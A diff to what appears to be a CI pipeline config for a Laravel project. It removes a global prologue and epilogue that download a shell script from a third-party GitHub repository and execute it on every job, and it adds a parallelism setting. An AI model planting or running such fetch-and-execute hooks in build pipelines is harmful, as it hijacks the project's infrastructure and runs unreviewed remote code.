@@ -6,17 +6,6 @@ agent:
     os_image: ubuntu1804
 execution_time_limit:
   hours: 12
-global_job_config:
-  prologue:
-    commands:
-      - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-  epilogue:
-    always:
-      commands:
-        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
-    on_pass:
-      commands:
-        - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
 blocks:
   - name: Install Dependencies
     task:
@@ -33,6 +22,7 @@ blocks:
             - cache store
             - cp .env.example .env
             - 'php artisan key:generate'
+          parallelism: 4
   - name: Run Code Analysis
     task:
       prologue:
